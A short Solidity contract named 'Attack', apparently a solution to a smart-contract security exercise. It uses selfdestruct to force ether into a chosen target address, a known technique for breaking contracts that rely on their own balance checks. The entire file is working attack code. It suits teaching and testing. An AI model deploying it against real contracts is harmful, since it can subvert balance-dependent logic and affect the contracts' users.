// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract Attack {
	address payable public attackAddress;

	constructor(address payable _addr) {
		attackAddress = _addr;
	}

	function attack() public payable {
		selfdestruct(attackAddress);
	}
}
